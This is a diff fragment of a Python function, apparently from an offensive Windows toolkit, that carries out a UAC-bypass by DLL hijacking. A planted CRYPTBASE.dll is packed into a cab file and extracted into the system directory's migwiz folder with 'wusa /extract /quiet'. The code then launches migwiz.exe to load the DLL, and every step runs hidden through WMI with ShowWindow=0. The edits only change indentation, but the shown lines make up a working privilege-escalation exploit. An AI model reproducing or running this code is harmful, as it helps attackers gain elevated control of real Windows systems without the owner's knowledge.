@@ -56,8 +56,8 @@ def migwiz(payload):
 	print_info("Attempting to create cabinet file")
 	if (os.path.isfile(os.path.join(tempfile.gettempdir(),"CRYPTBASE.dll")) == True):
 		makecab = wmi.Win32_Process.Create(CommandLine="cmd.exe /c makecab {} {}".format(os.path.join(tempfile.gettempdir(),"CRYPTBASE.dll"),
-											os.path.join(tempfile.gettempdir(),"suspicious.cab")),
-											ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
+								os.path.join(tempfile.gettempdir(),"suspicious.cab")),
+								ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
 		
 		time.sleep(5)
 
@@ -84,7 +84,7 @@ def migwiz(payload):
 	print_info("Attempting to extract the cabinet file")
 	if (os.path.isfile(os.path.join(tempfile.gettempdir(),"suspicious.cab")) == True):
 		wusa = wmi.Win32_Process.Create(CommandLine="cmd.exe /c wusa {} /extract:{}\migwiz /quiet".format(os.path.join(tempfile.gettempdir(),"suspicious.cab"),system_directory()),
-											ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
+								ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
 		
 		time.sleep(5)
 
@@ -108,10 +108,9 @@ def migwiz(payload):
 	"""
 	Run the executable to trigger the DLL
 	"""		
-
 	print_info("Attempting to run migwiz executable")
 	migwiz = wmi.Win32_Process.Create(CommandLine="cmd.exe /c {}\migwiz\migwiz.exe".format(system_directory()),
-										ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
+						ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
 				
 	time.sleep(5)
 
